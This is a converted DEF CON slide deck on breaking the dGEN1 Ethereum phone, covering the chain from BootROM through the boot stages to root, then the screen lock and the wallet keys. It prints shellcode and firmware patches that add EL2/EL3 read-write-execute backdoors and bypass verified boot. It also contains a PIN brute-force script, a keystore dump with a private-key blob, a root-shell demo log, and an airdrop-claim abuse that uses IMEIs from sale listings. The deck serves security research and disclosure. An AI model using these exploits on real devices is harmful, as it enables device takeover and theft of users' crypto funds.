---
title: "Breaking the Ethereum Phone From BootROM to Wallet Signing Keys"
speakers: ["Guanxing Wen"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Guanxing Wen - Breaking the Ethereum Phone From BootROM to Wallet Signing Keys - v1.pdf"
pages: 56
sha256: "54c55b24a556cf8cddfb05f78e76f56374e0535c2531747e0b2e143ed4374417"
text_chars: 19816
ocr_pages: 7
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:21:59Z"
---
# Breaking the Ethereum Phone From BootROM to Wallet Signing Keys

**Speakers:** Guanxing Wen  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Guanxing Wen - Breaking the Ethereum Phone From BootROM to Wallet Signing Keys - v1.pdf` (56 pages)

## Slide 1

# **Breaking the Ethereum Phone** `From BootROM to Wallet Signing Keys`

### Guanxing Wen

## Slide 2

## Guanxing Wen

#### ✤ Security Researcher at CertiK

> ✤ ZK, L2 infrastructure

> ✤ DePIN, Hardware wallet

> ✤ Bootloader, TEE and Kernel

x.com/hhj4ck

## Slide 3

## Crypto Phone

✤ Run a node, DeFi app stores, system wallet

✤ Private keys never leave secure enclave

✤ Airdrop value often exceeds the device cost

###### **_FREEDOM/FACTORY™_**

## Slide 4

## Ethereum Phone - dGEN1

> ✤ Built on **ethOS** (based on Android)

> ✤ Produced by Freedom Factory in 2026

##### ✤ Helio G99

## Slide 5

Android supports only secp256r1

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ij AGEN1 Wallet Architecture
A primer on how the keystorage works
The dGEN1 wallet implements a robust security model to ensure private keys are protected and only
used under authorized conditions. The private key exists in the Trusted Execution Environment (TEE)
and can never be removed, even by software updates.
App SystemUI
| Za
maces request te Prompts user to sign Executes signing on
eu 1c walle’ ce
ZZ correct biometrics
Public wallet Private wallet service
service (handles Signing on TEE)
```

## Slide 6

## Reversing ethOS

#### ✤ ethOS 4.0 is outdated

> ✤ New versions exist exclusively on the device

> ✤ Firmware extraction requires root level access

## Slide 7

## Explore the Download Protocol

> ✤ A common recovery and manufacturing path

> ✤ Experienced with Huawei and Qualcomm; want to explore MediaTek

> ✤ Bkerler’s edl and mtkclient are valuable resources

## Slide 8

## Normal Boot

Bootrom

Preloader

## Slide 9

## Normal Boot

VolUp
Bootrom power Preloader
VolDn

## Slide 10

## Download Mode

VolUp
Bootrom power Preloader
VolDn

## Slide 11

## Download Mode

Bootrom Preloader
Download
Agent

## Slide 12

## Download Mode

Bootrom Preloader
SLA/DAA
Download
Agent

## Slide 13

## Download Mode

Bootrom Preloader
SLA/DAA
Download
Agent

## Slide 14

## Download Mode

Bootrom Preloader
Download
Agent

## Slide 15

## Download Mode

Bootrom
Preloader

## Slide 16

## MediaTek Bootchain (Legacy)

Android
Bootrom LK?
Kernel
Preloader

## Slide 17

## MediaTek Bootchain

Bootrom Preloader

ATF (EL3) Nebula
BL2_EXT TEE (S-EL1) Android
GZ (EL2) LK

## Slide 18

## MediaTek Bootchain

ATF (EL3) Nebula
Bootrom Preloader BL2_EXT TEE (S-EL1) Android
GZ (EL2) LK

In-memory patches to avoid RoT state mismatch

## Slide 19

Loader of the Loader ✤ Locate free space in Stage **N** to inject Shellcode **N** , and hijack a non-critical function to trigger it. ✤ Stage **N** executes, loads and verifies Stage **N+1** , then triggers Shellcode **N** . ✤ Shellcode **N** applies stage-specific patches to Stage **N+1** , drops Shellcode **N+1** , and hooks the next trigger. ✤ As Stage **N+1** boots, the exact same cycle repeats for the next stage.

## Slide 20

## Preloader

Bootrom Preloader

ATF (EL3) Nebula
BL2_EXT TEE (S-EL1) Android
GZ (EL2) LK

## Slide 21

## Preloader

#### ✤ Load bl2_ext from LK at 0x62F0_0000, gz from GZ at 0x7F80_0000

|0x00000000 0x58881688|SIZE
NAME
…|0x00000000|0x58881688
SIZE|NAME
…|
|---|---|---|---|---|
|0x00000200|LK|0x00000200|g|z|
|0x200 + SIZE 0x58881688|SIZE
NAME
…|0x200 + SIZE|0x58881688
SIZE|NAME
…|
|0x400 + SIZE|BL2_EXT|0x400 + SIZE|unm|ap2|

## Slide 22

## Patch BL2_EXT from Preloader ✤ Load bl2_ext from LK at 0x62F0_0000, gz from GZ at 0x7F80_0000 ✤ Append shellcode and hook a logging function as the trigger

```
     // preloader.shellcode.c, used to patch bl2_ext
```

`#include "bl2_payload.h" extern const unsigned char bl2_ext_shellcode[]; extern const unsigned int bl2_ext_shellcode_len; #define MEMCPY (0x00235F78 + 1) void patch_point(void) { void (*cpy)(void*, void*, int) = (void (*)(void*,void*,int))MEMCPY;` ✤ ~~`void *f`~~ `reespace_bl2_shellcode = (void *)0x62f3c68c; cpy(freespace_bl2_shellcode, bl2_ext_shellcode, bl2_ext_shellcode_len); int *bl2_patch_point = 0x62F05A28;`

```
*bl2_patch_point = 0x94000000 | (freespace_bl2_shellcode - bl2_patch_point) >> 2;
}
```

## Slide 23

## GZ

Bootrom Preloader

ATF (EL3) Nebula
BL2_EXT TEE (S-EL1) Android
GZ (EL2) LK

## Slide 24

## GZ Decryption

```
// mtkclient/Library/Hardware/hwcrypto_dxcc.py
defdescramble(data):
key = bytes.fromhex("5C0E349A27DC46034C7B6744A378BD17")
iv = bytes.fromhex("A0B0924686447109F2D51DCDDC93458A")
ctr = Counter.new(128, initial_value=bytes_to_long(iv))
return AES.new(key=key, counter=ctr, mode=AES.MODE_CTR).decrypt(data)
```

## Slide 25

## Patch GZ from Preloader

> ✤ Load bl2_ext from LK at 0x62F0_0000, gz from GZ at 0x7F80_0000

> ✤ Attach shellcode to the end and hijack a logging function to trigger

> ✤ GZ Patch: Customized HVC handlers for EL2 RWX

`rwx_backdoor: AND X3, X0, #3      ; Extract cmd (0:R, 1:W, 2:X) BIC X4, X0, #7      ; Get 8-byte aligned base ptr CBZ X3, do_read ; Cmd 0 -> Read direct LDP X1, X2, [X4]    ; Load X1=addr/func, X2=data/arg CMP X3, #1 B.NE do_exec ; Cmd 2 -> Exec (if not 1)` ✤ `do_write: STR X2, [X1]        ; Write X2 to [X1] MOV X0, X2 ; Return written value RET do_exec: MOV X0, X2 ; Setup arg0 (X2 -> X0) BR X1 ; Branch to func (X1) do_read: LDR X0, [X0]        ; Read directly (ptr is already aligned) RET`

## Slide 26

## BL2_EXT

Bootrom Preloader

ATF (EL3) BL2_EXT TEE (S-EL1)

GZ (EL2)

Nebula Android LK

## Slide 27

BL2_EXT ✤ Load lk from LK at 0x050F_0000, atf from TEE image at 0x4820_0000 ✤ Put shellcode in a unused function and modify a call to trigger

> ✤ Utilize fastboot boot command

> ✤ atf Patch

> ✤ Customized SMC handlers for EL3 RWX

## Slide 28

## ATF

Bootrom Preloader

ATF (EL3) Nebula
TEE (S-EL1) Android
GZ (EL2) LK

BL2_EXT TEE (S-EL1)
GZ (EL2)

## Slide 29

Patch ATF from BL2_EXT ✤ Load lk from LK at 0x050F_0000, atf from TEE image at 0x4820_0000 ✤ Put shellcode in a non-used function and modify function call to trigger ✤ atf patch: Customized SMC handlers for EL3 RWX

```
rwx_backdoor:
ANDX3, X0, #3
BICX4, X0, #7
CBZX3, do_read
LDPX1, X2, [X4]
CMPX3, #1
B.NEdo_exec
do_write:
STRX2, [X1]
MOVX0, X2
RET
do_exec:
MOVX0, X2
BRX1
do_read:
LDRX0, [X0]
RET
```

## Slide 30

## Little Kernel

Bootrom Preloader

ATF (EL3) Nebula
BL2_EXT TEE (S-EL1) Android
GZ (EL2) LK

## Slide 31

## Little Kernel

#### ✤ Fastboot interaction

> ✤ load Kernel (boot.img)

> ✤ Patch lk from BL2_EXT

> ✤ Build a boot command with download + continue

> ✤ Bypass AVB verification

## Slide 32

```
// bl2.shellcode.c, used to patch lk
  #define P32(addr, val) *(int*)(addr) = (val)
staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out);
int patch_point() {
```

```
//modem related
     P32(0xFFFF000050F1C810, 0x52A20008); // Fix [malloc too large] (mov w8, #0x10000000)
     P32(0xFFFF000050F0B078, 0xD2800000); // Keep the normal loading path (mov x0, #0)
```

```
//boot related
     P32(0xFFFF000050F0583C, 0x52800022); // Allow 'continue' command (mov w2, #1)
     P32(0xFFFF000050F05BE0, 0xD503201F); // Prevent download buffer free (NOP)
      P32(0xFFFF000050F0C840, 0x52800c60); // Force enter fastboot_entry (mov w0, #99)
     P32(0xFFFF000050F71B5C, 0xD2800000); // Bypass AVB pubkey safe_memcmp (mov x0, #0)
     P32(0xFFFF000050F72534, 0xD2800000); // Bypass AVB hash safe_memcmp (mov x0, #0)
```

```
int *src = (int*)custom_disk_read, *dst = (int*)0xFFFF000050F15E74;
for(int i = 0; i < 0x200/4; i++) dst[i] = src[i]; // Copy disk_read hook to freespace
return0;
}
```

```
staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out) {
void (*cpy)(void*,void*,int) = (void*)0xFFFF000050F5BBB4;
long *dl_base = (long*)0xFFFF000051052070;
int *dl_sz = (int*)0xFFFF0000510520B0;
```

```
    *out = bytes;
```

```
if(*(int*)part == 0x746f6f62 && part[5] == 'b') { // Magic check: boot_b
cpy(buf, (void*)(dl_base[0] + off), bytes);
```

```
} else { // Fallback: Read other partitions from actual storage
long* (*bio_open)(char*) = (void*)0xFFFF000050F58C60;
long (*bio_read)(long*,char*,long,long) = (void*)0xFFFF000050F58CEC;
void (*bio_close)(long*) = (void*)0xFFFF000050F58BF0;
long *bdev = bio_open(part);
bio_read(bdev, buf, off, bytes);
         bio_close(bdev);
     }
return0;
}
```

## Slide 33

```
// bl2.shellcode.c, used to patch lk
  #define P32(addr, val) *(int*)(addr) = (val)
staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out);
int patch_point() {
//modem related
     P32(0xFFFF000050F1C810, 0x52A20008); // Fix [malloc too large] (mov w8, #0x10000000)
     P32(0xFFFF000050F0B078, 0xD2800000); // Keep the normal loading path (mov x0, #0)
//boot related
P32(0xFFFF000050F0583C, 0x52800022); // Allow 'continue' command (mov w2, #1)
     P32(0xFFFF000050F05BE0, 0xD503201F); // Prevent download buffer free (NOP)
      P32(0xFFFF000050F0C840, 0x52800c60); // Force enter fastboot_entry (mov w0, #99)
P32(0xFFFF000050F71B5C, 0xD2800000); // Bypass AVB pubkey safe_memcmp (mov x0, #0)
P32(0xFFFF000050F72534, 0xD2800000); // Bypass AVB hash safe_memcmp (mov x0, #0)
```

```
int *src = (int*)custom_disk_read, *dst = (int*)0xFFFF000050F15E74;
for(int i = 0; i < 0x200/4; i++) dst[i] = src[i]; // Copy disk_read hook to freespace
return0;
}
```

```
staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out) {
void (*cpy)(void*,void*,int) = (void*)0xFFFF000050F5BBB4;
long *dl_base = (long*)0xFFFF000051052070;
int *dl_sz = (int*)0xFFFF0000510520B0;
    *out = bytes;
```

```
if(*(int*)part == 0x746f6f62 && part[5] == 'b') { // Magic check:”boot_b’
cpy(buf, (void*)(dl_base[0] + (off < 0 ? off + dl_sz[0] : off)), bytes);
} else { // Fallback: Read other partitions from actual storage
long* (*bio_open)(char*) = (void*)0xFFFF000050F58C60;
long (*bio_read)(long*,char*,long,long) = (void*)0xFFFF000050F58CEC;
void (*bio_close)(long*) = (void*)0xFFFF000050F58BF0;
long *bdev = bio_open(part);
bio_read(bdev, buf, off < 0 ? off + bdev[4] : off, bytes);
         bio_close(bdev);
     }
return0;
}
```

## Slide 34

## Android Kernel

Bootrom Preloader

ATF (EL3) Nebula
BL2_EXT TEE (S-EL1) Android
GZ (EL2) LK

## Slide 35

## Post-Boot Control

#### ✤ SELinux Patch

> ✤ Kallsyms root backdoor

> ✤ SMC/HVC RWX wrapper

> ✤ …

## Slide 36

Demo: BootROM to Android Root

## Slide 37

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
hhjack@ubuntu: $ ./run.sh Jj
```

## Slide 38

Gatekeeper ✤ For hardware-wallet-like devices, screen lock is last barrier before signing ✤ The core component behind screen lock ✤ LockSettings (Java) -> gatekeeperd HAL (Native) -> TEE/Strongbox

## Slide 39

## Gatekeeper Java

```
// service.jar
```

```
publicVerifyCredentialResponseverifyCredential(...) {
// Permission checks...
longidentity= Binder.clearCallingIdentity();
try {returndoVerifyCredential(credential, userId, null, flags);} finally { ... }
}
```

/data/system_de/0/spblob/*.pwd

```
00: 0000 00 030b 030100 00 0010 a9 5f 40 9964
```

```
// Step 1: Stretch the PIN using parameters from .pwd
byte[] stretchLskf(LockscreenCredential credential, PasswordData data) {
// Params: N=(1<<11)=2048, r=(1<<3)=8, p=(1<<1)=2
returnscrypt(credential.getCredential(), data.salt,
1 << data.scryptLogN, 1 << data.scryptLogR, 1 << data.scryptLogP, 32);
}
```

```
10: ed 0e 07 1b 398e b5 bc 17 e5 4e 0000 00 3a 02
```

```
20: 2c 19 7e a4 22eb 0088 01 0000 0000 00 0000
```

```
30: 35af 33 54930d da 90 8a d8 69 4a 63 ff d9 ac
```

```
40: b1 12 18 e9 fd 0d 1b ae 12 7896 b8 1c e9 4d a4
```

```
// Step 2: Wrap it in SHA512
privatebyte[] stretchedLskfToGkPassword(byte[] stretchedLskf) {
    // GkPassword = SHA512("user-gk-authentication" + stretched PIN)
returnSyntheticPasswordCrypto.personalizedHash("user-gk-authentication", stretchedLskf);
}
response = gatekeeper.verifyChallenge(fakeUserId(userId), 0L, pwd.passwordHandle, gkPassword);
```

```
50: 4345 62 2c 3b 0592ce 01 ff ff ff ff
```

## Slide 40

Gatekeeper Native ✤ Gatekeeperd -> android.hardware.gatekeeper@1.0-service ✤ android.hardware.gatekeeper@1.0-impl*.so ❌ Not used on this device (QSEE / Trusty / OP-TEE …) 🤔 /vendor/lib64/hw/libSoftGatekeeper.so

## Slide 41

## Soft Gatekeeper, Not Enclave

```
boolCreatePasswordHandle(..., SizedBuffer *outhandle, uint64_tsalt, ...)
{
  handle_blueprint.version = version;
  handle_blueprint.salt = salt;
  handle_blueprint.is_hardware_backed = this->vtable->IsHardwareBacked(this) &1;
// 1. Attempt to get a hardware key
  key =0LL;
  key_len =0;
  this->vtable->GetPasswordKey(this, &key, &key_len);
// 2. Compute the signature
if ( key&& key_len )
gatekeeper::SoftGateKeeperDevice::ComputePasswordSignature(..., key, ...);
}
```

```
__int64 ComputePasswordSignature(..., void *key, ...)
{
```

```
// The 'key' argument is passed, but IGNORED in the calculation.
if ( signature )
returncrypto_scrypt(
             password,          // GkPassword
             password_length,
salt,              // Salt from Handle
8LL,               // Salt Length
16384uLL,          // N = 16384
8u,                // r = 8
1u,                // p = 1
             (__int64)signature,
             signature_length);
return result;
}
```

###### /data/system_de/0/spblob/*.pwd

```
00: 0000 00 030b 030100 00 0010 a9 5f 40 9964
```

```
10: ed 0e 07 1b 398e b5 bc 17 e5 4e 0000 00 3a 02
```

```
20: 2c 19 7e a4 22eb 0088 01 0000 0000 00 0000
```

```
User_ID . . . . . .Flags . . . . . . .
30: 35af 33 54930d da 90 8a d8 69 4a 63 ff d9 ac
```

```
Salt2 . . . . . . .Signature . . . . .
```

```
40: b1 12 18 e9 fd 0d 1b ae 12 7896 b8 1c e9 4d a4
```

```
. . . . . . . . . . . . . . . . . . . .
50: 4345 62 2c 3b 0592ce 01 ff ff ff ff
```

```
. . . . . . . . . .
```

## Slide 42

## Brute-force

```
import hashlib
import scrypt
```

```
defcheck_password(pwd, p):
```

```
    sp_hash = scrypt.hash(pwd.encode(), p['sp_salt'], p['sp_N'], p['sp_r'], p['sp_p'], 32)
    tag = b"user-gk-authentication".ljust(128, b'\x00')
    gk_pwd = hashlib.sha512(tag + sp_hash).digest()
Signature == Scrypt_Native(
    hal_hash = scrypt.hash(p['gk_hdr'] + gk_pwd, p['gk_salt'], 16384, 8, 1, 32)
    SHA512("user-gk-authentication" + Scrypt_Java(PIN, Salt1, N=2048, r=8, p=1)),
    Salt2,
return hal_hash == p['expected']
    N=16384, r=8, p=1
```

```
)
defworker(wid, step, max_val, digits, p, stop_ev):
    fmt = f"%0{digits}d"
for i inrange(wid, max_val, step):
if stop_ev.is_set(): return
```

```
        pwd = fmt % i
if check_password(pwd, p):
print(f"[+] FOUND: {pwd}")
            stop_ev.set()
return
```

```
# ... parse_pwd() ...
# ... multiprocessing setup & main loop ...
```

## Slide 43

DEMO: Brute-force the Screen Lock

## Slide 44

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Preloader - Target config: Oxed
Preloader - SBC enabled: False
Preloader - SLA enabled: False
Preloader - DAA enabled: False
Preloader - SWJTAG enabled: False
Preloader - EPP_PARAM at @x600 after EMMC_BOOT/SDMMC_BOOT: False
Preloader - Root cert required: False
Preloader - Mem read auth: True
Preloader - Mem write auth: True
Preloader - Cmd 0xC8 blocked: True
Preloader - Get Target info
Preloader - BROM mode detected.
Preloader - HW subcode: 0x8a00
Preloader - HW Ver: Qxca00
Preloader - SW Ver: 0x0
Preloader - ME_ID: E6CF7DD7A725C7D56C14F2E151D05B8C
Preloader - SOC_ID: A416C185D6FEFDODD29689438A88AF17E19796DQOEACDEDA721DC78
4BD7B8A519
Main - Connected to device, loading
Main - Using custom preloader : exploit/preloader.patch
Mtk - Valid preloader detected.
Mtk - Patched "Patched loader msg" in preloaderp
Main - Sent preloader to 0x201000, Length 0x59410
Preloader - Jumping to 0x201000
Preloader - Jumping to 0x201000: ok.
Main - PL Jumped to daaddr 0x201000.
Main - Keep pressed power button to boot.
< waiting for any device >
Warning: skip copying x image avb footer (x partition size: 0, x image size: 67108864).
Sending 'x' (65536 KB) OKAY [ 3.245s]
Writing 'x' FAILED (remote: 'No support by lock control
‘)
fastboot: error: Command failed
Resuming boot OKAY [ 0.002s]
Finished. Total time: 0.002s
[nhjack@ubuntu: $ adb shell
|k6789v1_64:/ $ cd /data/local/tmp
|k6789v1_64:/data/local/tmp $ ./ssu
[+] Got root!
|k6789v1_64:/data/local/tmp # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
k6789v1_64:/data/local/tmp # Jj
```

## Slide 45

## Private Key Extraction

#### ✤ libPureSoftKeymaster.so

```
// Decompiled: keymaster::PureSoftKeymasterContext::CreateKeyBlob
__int64 __fastcall CreateKeyBlob(..., _QWORD *key_blob, ...)
{
// CRITICAL: Instead of encrypting with a hardware key,
// it simply SERIALIZES the key material.
```

`v17 = keymaster::SerializeIntegrityAssuredBlob(v31, &v41, a6, a7, a5); // ... return v17; }` ✤

## Slide 46

## Private Key Extraction

#### ✤ libPureSoftKeymaster.so ✤ /data/misc/keystore/persistent.sqlite

```
INSERT INTO keyentry VALUES(3065640756493233690,0,2,104,'p256_ethOS',1,X'00000000000000000000000000000001');
```

`-- The X.509 Certificate INSERT INTO blobentry VALUES(49,1,3065640756493233690,X'3082011f3081c5a003020102020101300a06082a8648ce3d040302300f310d300b060355040 3130446616b65301e170d373030313031303030303030...');` ✤

```
-- The Key Blob
INSERT INTO blobentry
VALUES(97,0,3065640756493233690,X'0079000000307702010104204cde5ada23b8ba27c1154ad31728ed9a522165c14a85529b2ea
795be959ed24da00a06082a8648ce3d030107a144034200043ea89b4e985209b30e2ebc53135fe9f09fb8c6ce34f4c1465bf63b11f48f
8a31298f753286b68364d6ad0e742ed7cc3e7c1ab3e8f67eb7d14e747141574e5726000000000000000000000000000000000c0000006
1000000030000300001000002000010030000000a00001001000000010000200200000001000020030000000500002000000000050000
2004000000f701007001bd020060cc36e95999010000be02001000000000c1020030f0490200c20200300f1703001bca7dbb931e9da9'
);
```

## Slide 47

## ERC-4337 Smart Account

> ✤ EOA Priv -> Pub -> EOA Address

> ✤ secp256k1 (Not supported natively by Android)

> ✤ ERC-4337 Priv -> Pub -> Stored in a ERC-4337 contract

> ✤ secp256r1 or any other algorithm

> ✤ Contract.isOwnerAddress to verify ownership

## Slide 48

DEMO: Private Key Extraction

## Slide 49

## Slide 50

## One More Thing: The Airdrop Heist

> ✤ imeihash = sha256(imei + "|" + serialNumber);

> ✤ Signature = api.claimPermit(imeihash, beneficiary);

> ✤ Claim on-chain: Contract.claim(imeihash, beneficiary, signature)

## Slide 51

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ve
| T
Ce
Il
China
GENT
355526230106096
CTT UT
2:
SOU OT
MT
IMEI 1: 355520230045591
```

## Slide 52

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Freedom Factory Inc
== 4 Peddlers Row 295
Newark, DE 19702
SN: dG146829G47T eae
IMEI 1: $55520230045591
60014"38080!'"8
IMEI 2: 355520230106096
EU TEE TEU UORDATI TY 0) ET
Assembled in China 8
```

## Slide 53

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Shop b
eb category Y (a Search for anything
All Categories -) ( Search ) Advanced
(*) LIVE Streaming now Shop exclusive items from trusted sellers t Join event ]
1 WATCHED TODAY
JGEN!I
" “
UU
UU
UU
Upgrading? Sell it, don't trade it. | Sell one like this | Sell something else
dGEN1 Ethereum NEW Phone Freedom Factory -
256GB / 8GB RAM - ethOS v4 - Web3 EDC
meclo78 (0) oO
- | Message >
Seller's other items a
US $249.00
lbid - Ends in 4d 12h - Wednesday, 11:18 AM
No Interest if paid in full in 6 mo on $149+ with PayPal Credit*
Condition: New @
Place bid
(— >
XY SJ
4 People are checking this out. 3 have added this to their watchlist.
Shipping, returns, and payments
Pickup: Free local pickup from Clearwater, Florida, United States 33755
Shipping: US $10.41 USPS Ground Advantage®. See details
Located in: Clearwater, Florida, United States
Delivery: Estimated between Sat, May 2 and Fri, May 8 to 07020 ©
```

## Slide 54

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
eb category Y (a Search for anything All Categories -) ( Search ) Advanced
tt LIVE Streaming now Shop exclusive items from trusted sellers t Join event ]
dGen! Ethereum Phone, in hand, sealed. Freedom
uw 79 Factory. Trade Onchain
tayjor1 (3207) —
2X i - Message >
100% positive - Seller's other items
, C $225.00
Approximately US $164.22
Condition: New @
JdGEN1 ier see
88: goIsoseeoiU —
IMEI 2: 365620230098103 \ }
010 | UENO) EA TE pitt)
Aeeenbled in Chins eMeooaa: es
9 Add to Watchlist
4 People are checking this out. 7 have added this to their watchlist.
Shipping, returns, and payments
Shipping: C $108.39 (approx US $79.11) eBay International Shipping ©.
See details
Located in: SPRUCE GROVE, Canada
Upgrading? Sell it, don't trade it. | Sellonelikethis || Sell something else | Share |
Import fees: Est. US $0.75Final at checkout ©
```

## Slide 55

## Conclusion

> ✤ Download mode was expected to be authenticated.

> ✤ Screen lock was expected to be hardware-backed.

> ✤ Wallet private key was expected to stay in secure enclave.

> ✤ Airdrop identity was expected to prove ownership.

## Slide 56

## **Questions?**

x.com/hhj4ck
